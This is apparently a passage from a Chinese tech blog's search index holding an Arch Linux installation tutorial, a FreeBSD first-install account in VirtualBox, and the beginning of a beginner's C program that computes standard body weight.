Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装条件 总的来说，Arch 对配置的要求并不是太高，因为它默认安装完不带任何软件（甚至是 vim、wget、git）。但是，由于用户需要安装和使用的软件不同，因此配置需求也会根据实际情况而变化。 这里根据个人经验例举几个，仅供参考 不使用图形界面 处理器需求: 1.0Ghz 单核或更好的 内存需求: 1GB 足够 显卡需求: 能亮就行 图形界面: lxde 处理器需求: 2.0Ghz 单核或更好的 内存: 2GB 或者更多 显卡需求: 能亮就行…. 图形界面: xfce 处理器需求: 2.0GHz 单核 ~ 3.0 Ghz 单核 或更好的 内存: 至少 2GB ，4GB 很够用 显卡需求: 能亮还得有 128MB 显存 图形界面: Gnome 处理器需求: 双核 2.0GHz以上 内存: 4GB 足够，但推荐更多 显卡需求: 一般的Intel核显如果有256MB显存就很流畅了 (一位不愿意透露姓名的 Gnome 用户表示不要推荐 Gnome) 图形界面: KDE 处理器需求: 尽量要有 3.0GHz 双核，至少 2.6GHz 双核 内存: 4GB 足够，但推荐更多 显卡需求: 尽量比上面 Gnome 的更好一些 Emmmm… 总的来说… 只要是个电脑，都能运行起来，只不过用 KDE 和 Gnome 会比较卡而已.. 只要不是上世纪的486电脑.. xfce应该都是带得动的。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:2:1","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"准备工作 这里会说明一下安装前需要准备什么 安装介质 如果你曾经安装过其他 Linux 发行版，则不需要花太多时间看这一段，因为Arch Linux的安装介质的制作与其他发行版也是相差不大的。 如果你曾经重装过 Windows 操作系统，但没试过安装Linux ，也许你只需要稍微看一下，就会明白怎么做了 第一步、下载Arch Linux的ISO镜像文件 你可以去 Arch 官网下载，也可以去你所在位置的开源镜像站下载，这里贴出 清华源传送门 中科大源传送门 第二步、准备一个U盘 你需要准备一个U盘来刻录 ArchISO，最好是 8GB 以上 第三步、使用刻录软件将 ArchISO 刻录进U盘 Windows 环境: 这里推荐 rufus Linux 环境: 可以使用 DD 命令 （如果电脑不支持EFI启动，不推荐。） 篇幅原因，这个就不写太多吧 不爆炸的心态 如果你从未接触过 Arch Linux 或者是 Linux 新手，在安装过程中难免会遇到问题，这个时候不要慌张也不要着急，平静下来通过各种途径找出解决方法，不过这都需要有个不爆炸的心态。 阅读 Arch Wiki Arch 官方搭建了一个 Wiki 供用户查阅资料，当遇到安装过程中遇到麻烦的时候，也许 Arch Wiki 能够帮到你。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:2:2","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"一切准备就绪，出发 当你准备好一切的时候，就可以开始安装了。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:0","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"启动 Arch ISO 首先插入你的 U 盘，然后在开机时按特定的按键以启动 U 盘中的ArchISO 这里放出不同品牌设备或主板的按键 品牌台式 联想台式电脑 F12 惠普台式电脑 F12 宏基台式电脑 F12 戴尔台式电脑 ESC 神舟台式电脑 F12 华硕台式电脑 F8 方正台式电脑 F12 清华同方台式电脑 F12 海尔台式电脑 F12 明基台式电脑 F8 品牌笔记本 联想笔记本 F12 宏基笔记本 F12 外星人笔记本 F12 小米笔记本 F12 华硕笔记本 ESC 惠普笔记本 F9 联想 Thinkpad F12 戴尔笔记本 F12 神舟笔记本 F12 东芝笔记本 F12 三星笔记本 F12 IBM笔记本 F12 富士通笔记本 F12 海尔笔记本 F12 方正笔记本 F12 清华同方笔记本 F12 微星笔记本 F11 明基笔记本 F9 技嘉笔记本 F12 Gateway笔记本 F12 eMachines笔记本 F12 索尼笔记本 ESC 苹果笔记本 开机长按 option 键 主板 华硕主板 F8 技嘉主板 F12 微星主板 F11 映泰主板 F9 梅捷主板 ESC 或 F12 七彩虹主板 ESC 或 F11 华擎主板 F11 斯巴达卡主板 ESC 昂达主板 F11 双敏主板 ESC 翔升主板 F10 精英主板 ESC 或 F11 冠盟主板 F11 或 F12 富士康主板 ESC 或 F12 顶星主板 F11 或 F12 铭瑄主板 ESC 盈通主板 F8 捷波主板 ESC Intel 主板 F12 杰微主板 ESC 或 F8 致铭主板 F12 磐英主板 ESC 磐正主板 ESC 冠铭主板 F9 按下对应的按键，选择你的 U 盘，即可启动 Arch ISO。 如上图，Arch ISO 启动后将会出现这样的界面，直接选择第一项回车即可。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:1","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"确认是否连接到网络 启动Arch ISO之后，你将操作一个运行在 tty 上的 Live CD，这个时候第一件事就是检查有没有连接到网络。 你可以使用 ping 这个命令来确认是否连接到网络，随便一个非局域网地址都可以 # ping weepingdogel.github.io 若返回出类似这样的信息，则说明网络连接是正常的 PING weepingdogel.github.io (185.199.111.153) 56(84) bytes of data. 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=2 ttl=48 time=113 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=3 ttl=48 time=110 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=4 ttl=48 time=114 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=5 ttl=49 time=113 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=6 ttl=48 time=111 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=7 ttl=48 time=112 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=8 ttl=49 time=113 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=9 ttl=49 time=111 ms 64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=10 ttl=48 time=111 ms ^C --- weepingdogel.github.io ping statistics --- 11 packets transmitted, 9 received, 18.1818% packet loss, time 10801ms rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms 如果返回的不是类似于上面的信息，那么你可能没有正确连接到网络，你需要这样做 检查网卡 # ip link 将会返回这些 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: enp3s0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether bc:5f:f4:aa:04:c9 brd ff:ff:ff:ff:ff:ff lo 是指 localhost ，一般情况下，如果你只有一个网卡的话，类似于 enp3s0 的名称就是你的网卡了，但不同品牌的网卡显示的也不同，如 Intel 网卡可能显示为 ens33 之类的。下面用 \u003c网卡名\u003e 来指代吧 设置网卡 # ip link set \u003c网卡名\u003e up 使用 dhcpcd 命令来自动匹配 DHCP 地址 # dhcpcd 它会自动帮你获取到 DHCP 地址，然后你就能连接到网络了 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:2","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"同步系统时间 你需要保证 Live CD 目前的时间是准确的 这里执行 timedatectl 命令 # timedatectl set-ntp true ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:3","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"分区 这里一直都是比较关键的部分，分区.. 首先，你需要查看你的硬盘是否被识别 # fdisk -l 这里引入一个 块设备的概念 也就是说如果被识别到，就会以 /dev/sda 或者 /dev/nvme0n1 这样，来表示你的硬盘。 rom，loop，或者airoot 这样的，可以忽略不管。 建立分区 有两种分区方式，一种是对于 BIOS+MBR 启动的，另一种是 UEFI启动配GPT分区的。 这里列个表格吧 BIOS 和 MBR 挂载点 分区 分区类型 建议大小 /mnt /dev/sdX1 Linux 剩余空间 [SWAP] /dev/sdX2 Linux swap (交换空间) 大于 512 MB UEFI with GPT 挂载点 分区 分区类型 建议大小 /mnt/boot/EFI /dev/sdX1 EFI 系统分区 260-512 MB /mnt /dev/sdX2 Linux 剩余空间 [SWAP] /dev/sdX3 Linux swap (交换空间) 大于 512 MB Live CD 里面有几种分区工具 fdisk、parted、cfdisk 等，具体过程我就不写出来了，我推荐用cfdisk，操作简单。 注意：nvme 协议的硬盘设备名可能不是表上这个，也许是 nvme0p1 之类的。 格式化 当你的分区建好了，这些分区要进行格式化 BIOS + MBR: # mkfs.ext4 /dev/sdX1 UEFI with GPT: # mkfs.ext4 /dev/sdX2 # mkfs.vfat -F 32 /dev/sdX1 不同的分区需要选择不同的文件系统，这个你需要去搜索引擎搜索了，篇幅有限，解释不了这么多。 对于交换分区(第一个表中的 /dev/sdx2、第二个表中的 /dev/sdX3)，需要使用 mkswap 将其初始化： # mkswap /dev/sdX2 挂载 swap # swapon /dev/sdX2 挂载分区 将根分区挂载到/mnt，参考命令: # mount /dev/sdX1 /mnt ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:4","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装基本系统 这个时候我们就已经可以安装基本系统了，但仍需要按照下面的步骤做 选择镜像 Arch Linux是通过网络安装的，它会通过镜像源直接在所在的分区下载需要的安装文件，安装速度较快，这也是为什么要确认网络是否连接。 而现在要做的是选择离你所在地最近的镜像源 这个文件 /etc/pacman.d/mirrorlist 里面写好了所有的镜像源，定义了软件包会从哪一个镜像源下载。在 Live CD 中，所有的镜像都会被启用，文件中是按照同步情况和速度进行排序的。 这个是你需要做的是修改它的顺序，将离你最近的镜像地址修改到第一位，你可以使用 nano 进行修改 # nano /etc/pacman.d/mirrorlist 在 nano 中，CTRL+W 为搜索，你可以通过这个在文件中搜索你所在国家或地区的名称，再将其下面的镜像地址使用 CTRL+K 进行剪切，再将其用 CTRL+U 粘贴到第一行即可。 安装必要软件包 Linux是由软件包组成的操作系统，而如果要启动它，就必须具备必要的软件包。 这个时候我们使用 pacstrap 脚本，安装 base 软件包 和 Linux 内核还有硬件的固件，这样基本系统很快就构建完成了。 # pacstrap /mnt base linux linux-firmware 我推荐这样 # pacstrap /mnt base base-devel linux linux-firmware linux-headers 这样能够尽可能的安装上更多的基本软件。 一顿文字输出过后，基本系统就安装完成了。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:5","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"配置系统 基本系统刚安装完是没有灵魂的，需要进行配置才能完美地使用 Fstab 首先肯定要生成一个fstab文件，否则系统连硬盘都不认识。 用 genfstab 来生成 # genfstab -U /mnt \u003e\u003e /mnt/etc/fstab 最好在执行完以上命令后查看一下生成的 /mnt/etc/fstab 文件是否正确。 # cat /mnt/etc/fstab Chroot Chroot 是 “Change root” 的缩写，意思是更改根目录，而我们需要将 Live CD 的根目录更改为你安装好的系统的目录，这样才能操作它 用 arch-chroot 这个命令就可以了 # arch-chroot /mnt 时区 chroot 完以后，第一步要修改时区 # ln -sf /usr/share/zoneinfo/Region/City /etc/localtime 例如 # ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 接下来运行 hwclock 生成 /etc/adjtime # hwclock --systohc 本地化 本地化的程序与库若要本地化文本，都依赖 Locale，后者明确规定地域、货币、时区日期的格式、字符排列方式和其他本地化标准等等。在下面两个文件设置：locale.gen 与 locale.conf。 —— Arch Wiki 所以不用多解释了… 编辑这个文件 /etc/locale.gen ，移除需要语言前面的 # # vim /etc/locale.gen 然后执行 locale-gen 生成 locale 讯息: # locale-gen 在 /etc/ 目录下创建 一个叫 locale.conf 的文件 # vim /etc/locale.conf 写入以下内容 LANG=en_US.UTF-8 网络 首先需要安装的是 networkmanager 这个包，不然安装完成重启后就需要手动配置网络了。 # pacman -S networkmanager 启用 NetworkManager 服务 # systemctl enable NetworkManager 接下来创建一个 hostname 文件，这个文件存储你的主机名 # vim /etc/hostname 写入以下内容，随便写，但是要记住，这里以 myhostname 代替了， myhostname 接下来编辑 /etc/hosts 这个文件 # vim /etc/hosts 写入以下内容 127.0.0.1 localhost ::1 localhost 127.0.1.1 myhostname.localdomain myhostname 接下来，执行 # systemctl enable dhcpcd 然后在安装完成之后就不需要担心网络连接问题了 Root 密码 你需要设置一个 root 密码 # passwd 这样基本系统就差不多完成了，但是现在还不能重启，因为它目前无法被引导。 ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:6","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装启动引导器 如上面所说，你需要一个启动引导程序才能启动系统，Linux 有很多类似于这样的软件，可以在这个页面参考. 我推荐使用 GRUB 安装Grub 先安装 grub 这个软件包 # pacman -S grub 这里要考虑到两种情况了, 第一种情况: BIOS + MBR 直接执行这条即可 # grub-install --target=i386-pc /dev/sdX 如果它返回出 no erros 之类的,那么就可以执行下面的了. 生成 grub 配置文件 # grub-mkconfig -o /boot/grub/grub.cfg 接下来就可以拔掉 U 盘重启了 # reboot 第二种情况: UEFI + GPT 这种情况的比较复杂一些, 首先挂载你的EFI分区 # mount /dev/sdX1 /boot/EFI 接下来执行 # grub-install --target=x86_64-efi --efi-directory=/boot/EFI/ --bootloader-id=GRUB 然后还是一样的生成配置文件 # grub-mkconfig -o /boot/grub/grub.cfg 接下来就可以拔掉 U 盘重启了 # reboot ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:3:7","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装后工作 装完后要做的一些事情. ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:4:0","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"创建普通用户 装完以后, 不建议直接使用 root 用户,需要创建一个普通用户 先使用 root 用户登录,执行这条命令创建一个普通用户 # useradd -G wheel -m -s /bin/bash \u003c用户名\u003e 接下来给你的用户设置密码 # passwd \u003c用户名\u003e 将其添加到 sudoers 列表, 如果你没有安装 sudo 或 base-devel 请先执行 # sudo pacman -S sudo 然后编辑 /etc/sudoers 这个文件 # vim /etc/sudoers 将你的用户名添加到 root 的下面,照抄即可 # Defaults!/usr/bin/sudoreplay !log_output # Defaults!/usr/local/bin/sudoreplay !log_output # Defaults!REBOOT !log_output ## ## Runas alias specification ## ## ## User privilege specification ## root ALL=(ALL) ALL \u003c用户名\u003e ALL=(ALL) ALL 重启即可登录普通用户了. ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:4:1","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装图形界面 在安装图形界面之前,我们需要安装的是 xorg , 它是大多数图形界面的依赖… 算了,这么一大堆说完肯定….直接一套安排上吧(xfce) 安装软件包 $ sudo pacman -S xorg xfce4 lightdm lightdm-greeter-gtk 设置lightdm启动权限 $ sudo systemctl enable lightdm ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:4:2","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["Arch Linux 入坑手册"],"content":"安装显卡驱动 显卡驱动软件包列表. extra/xf86-video-amdgpu 19.1.0-2 (xorg-drivers) X.org amdgpu video driver extra/xf86-video-ati 1:19.1.0-2 (xorg-drivers) X.org ati video driver extra/xf86-video-dummy 0.3.8-4 (xorg-drivers) X.org dummy video driver extra/xf86-video-fbdev 0.5.0-2 (xorg-drivers) X.org framebuffer video driver extra/xf86-video-intel 1:2.99.917+908+g7181c5a4-1 (xorg-drivers) X.org Intel i810/i830/i915/945G/G965+ video drivers extra/xf86-video-nouveau 1.0.16-2 (xorg-drivers) Open Source 3D acceleration driver for nVidia cards extra/xf86-video-openchrome 0.6.0-4 (xorg-drivers) X.Org Openchrome drivers extra/xf86-video-sisusb 0.9.7-3 X.org SiS USB video driver extra/xf86-video-vesa 2.4.0-3 (xorg-drivers xorg) X.org vesa video driver extra/xf86-video-vmware 13.3.0-2 (xorg-drivers) X.org vmware video driver extra/xf86-video-voodoo 1.2.5-11 (xorg-drivers) X.org 3dfx Voodoo1/Voodoo2 2D video driver community/xf86-video-qxl 0.1.5-7 (xorg-drivers) Xorg X11 qxl video driver vesa 会自动装上, 自己是什么显卡就装什么, 不需要过多解释了吧… Intel 核显 $ sudo pacman -S xf86-video-intel NVIDIA $ sudo pacman -S xf86-video-nouveau AMD $ sudo pacman -S xf86-video-amdgpu 好啦 装完啦~ 接下来系统就可以使用啦~ ","date":"2020-06-13","objectID":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/:4:3","tags":["Arch Linux","笔记","系统安装","Arch 入门","教程"],"title":"怎样安装 Arch Linux","uri":"/zh-cn/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/"},{"categories":["BSD"],"content":"别想歪了，这是一篇记录首次安装并使用FreeBSD的博客 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"开场白 闲着无聊我又来水文章更新了，这次准备水写一篇比较长的，然后就想对FreeBSD下手了,嘿嘿。 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:1:0","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"FreeBSD介绍 FreeBSD是一个类Unix的操作系统，它与Linux还是有区别的…… Unix…感觉很少人用吧..估计比Linux还少，不过服务器用用应该还不错吧… 维基百科是这么说的 : FreeBSD是一个类Unix的操作系统，也是FreeBSD项目的发展成果。[2]FreeBSD是第一个开放源代码的系统，他是由基于BSD Unix的源代码派生而来的。BSD Unix是加州大学伯克利分校在1975年至1993年开发的操作系统。FreeBSD被开发为自由软件，这意味着其源代码开放，人人都可以使用FreeBSD。任何人都可以获得并使用它来满足各种需求，也可以修改它，然后再重发布它。此功能专为个人和公司量身定制，可用于创建各种基于FreeBSD的商业和非商业产品。尽管FreeBSD直接从BSD派生，但是从法律的角度来看，FreeBSD为 unix 系统，但它并不是“UNIX”。因为现在“UNIX”商标是属于国际开放标准组织的。[3]FreeBSD的第一个版本于1993年发布。 FreeBSD是一个支持许多硬件和体系架构的企业级系统。和其他BSD家族的操作系统一样， FreeBSD其核心、驱动程序以及所有的用户层（Userland）应用程序（如Unix shell和cat和ps等命令）都存储在源代码库中。[4]FreeBSD也可以运行其他二进制软件，比如Linux的。借助ports和FreeBSD软件包管理器，你可以在其上安装各种应用程序。根据2005年的调查，77％的BSD用户使用FreeBSD，因此FreeBSD拥有BSD系列中最大的用户社区。[5] 在今天，个人和企业都将FreeBSD用于多种用途，包括Yahoo! [6]，苹果[7]，Juniper网络公司，诺基亚，IBM， Yandex的，Apache软件基金会，Hotmail，索尼和许多其他用途 [Read More] ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:2:0","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"安装 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:3:0","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"准备工作 我打算在虚拟机里玩玩就好啦～ 问:是VirtualBox吗？ 对，之前介绍过的VirtualBox，也应该没什么好讲的了，创建一个虚拟机应该不是问题，问题是接下来如何进行安装。 除了虚拟机我们还要准备的东西就是FreeBSD的安装镜像了，可以去官方的源下载，但是考虑到速度问题，也可以去墙内的一些镜像站下载。 USTC Mirror 注意：下载的时候要确定你的架构，别下错了(应该大部分都是amd64吧) 什么？你说配置要求？嘛… 看看官网怎么说 FreeBSD/i386 和 FreeBSD/pc98 版本， 都需要 486 或更高的处理器，以及至少 24 MB 的 RAM。 您需要至少 150 MB 的空闲硬盘空间， 才能完成最小的安装配置。 至于amd64架构嘛，一句话，你有处理器有内存有硬盘就能用，而且我们都用虚拟机了 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:3:1","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"安装过程 首先肯定是先把镜像导入虚拟机啦，这个我就不再写一遍了，百度谷歌能搜到的… 然后我们启动，就会看到这个可爱的画面.. 你可以直接按回车，也可以等10秒让它自动启动… 启动之后就会来到这个界面 选择Install按回车啦 然后是选择键盘类型，这里选United States Of America 选完以后回到第一项回车即可，当然你也可以在第二项那里测试你的键盘是否有效 什么？你看不懂英文？ 第一项是继续 第二项是测试键盘 下面的就是地区或者国家名称了 接下来输入你的主机名 我就随便输入一个localhost吧 然后回车 然后我就懵逼了。。 然后看了下英文手册，这里是选择要安装的组件 根据官方的指引，这里来翻译一下… base-dbg 一些基础的软件包,比如’cat’这样的（debugging） kernel-dbg 内核和内核模块（debugging） lib32-dbg 32位的依赖吧好像是，带（debugging）的 lib32 同上，但是不带（debugging） ports 嗯..类似于Gentoo的portage，必须装 src 一些源代码，最好选上吧 tests 一些测试代码，没必要选了 想了一会儿，然后决定这样选了，你问凭什么这样选，我凭经验 那你就应该凭借翻译软件把官方的手册翻译完看一遍了 接下来是分区 这里有四种方式啊… Auto(UFS) 以UFS文件系统自动进行分区 Manual 手动对硬盘进行分区 shell 使用命令对硬盘进行分区 Auto(ZFS) 用ZFS文件系统自动分区 行吧，选第二项，手动 然后就进了这里 然后，选create创建一个分区表，官方手册有说明要创建一个GPT分区表，但这里由于我没有开启EFI所以我用MBR 这里的图形操作会有提示的，看不懂英文的可以用翻译器看一下 什么？还是不会？这玩意跟cfdisk差不多的 总之详细过程我就不截图出来了，只需要把分区分成这样就行 接下来选择Finish,再选择Commit 然后就会慢慢安装了 接下来就需要设置一个密码了，毕竟Unix的系统是不能空口令登录的 跟Linux一样，设置一个能记住的就可以了，然后会让你确认网卡 后面一路选yes，不多说 这里直接全选 然后回车，这里把6勾选上，继续按回车 最后一个提示，yes，然后回车 然后重启，自动启动，再登录root，就完成啦 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:3:2","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"装完后的感想 FreeBSD注定是适合服务器的，或许也适合拿来玩，但日常使用的话就会出现很多问题让人头疼 反正我是不会玩啦..连个顺手的文本编辑器都没有…vi我是真用不来…要修改很多配置文件的说.. 如果你有什么主意的话，就在下面留言吧 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:4:0","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["BSD"],"content":"参考链接 FreeBSD 使用手册（英文） FreeBSD 官网 ","date":"2020-03-30","objectID":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/:5:0","tags":["Unix","FreeBSD","教程","安装"],"title":"FreeBSD 初♂体验","uri":"/zh-cn/posts/freebsd%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"categories":["编程"],"content":"一个简易的标注体重评测程序，用的是世卫的计算方法。","date":"2020-03-29","objectID":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/","tags":["C语言","编程"],"title":"一个C语言的小程序","uri":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"categories":["编程"],"content":"简介 嘛…学了一会儿C语言弄了这么个玩意👑 其实就是基础语法和简单的判断👑 ","date":"2020-03-29","objectID":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/:1:0","tags":["C语言","编程"],"title":"一个C语言的小程序","uri":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"categories":["编程"],"content":"代码 废话不多说直接上代码👑 /* 标准体重计算器 By WeepingDogel 世卫计算方法 男性：(身高cm－80)×70﹪=标准体重 女性：(身高cm－70)×60﹪=标准体重 标准体重正负10﹪为正常体重 标准体重正负10﹪~ 20﹪为体重过重或过轻 标准体重正负20﹪以上为肥胖或体重不足 超重计算公式 超重%=[（实际体重－理想体重）/（理想体重）]×100% */ /*导入标准库stdio.h （必须）*/ #include \u003cstdio.h\u003e /*标准体重*/ int weight; /*声明函数*/ float judge(float parameter1,float parameter2); float Count_M(float parameter); float Count_F(float parameter); /*声明主函数main() (这个都不写，那写个屁)*/ int main() { printf(\"欢迎使用.\"); /*身高*/ int height; /*声明变量sex表示性别*/ char sex; /*声明变量：实际体重*/ int real_weight; /*提示用户输入性别*/ printf(\"请输入你的性别\\n（M为男性,F为女性,注意大小写）\"); printf(\"\\n\\n:\"); /*读取用户输入的数据并赋值给sex*/ scanf(\"%c\",\u0026sex); /*进入判断，并判断变量sex的值是否为M*/ if(sex == 'M') { /*当变量sex=M时，判断为男性，将执行以下代码*/ printf(\"你是男性\"); printf(\"输入你的身高(单位:厘米)\"); printf(\"\\n\\n:\"); scanf(\"%d\",\u0026height); weight = (int) Count_M((float) height); printf(\"你的身高对应的标准体重为%dkg\\n\",weight); printf(\"请输入你的实际体重(单位:kg)\"); printf(\"\\n:\"); scanf(\"%d\",\u0026real_weight); judge((float) real_weight,(float) weight); } /*进入判断，并判断变量sex的值是否为F*/ else if(sex == 'F') { /*当变量sex=F时，判断为女性，将执行以下代码*/ printf(\"你是女性\"); 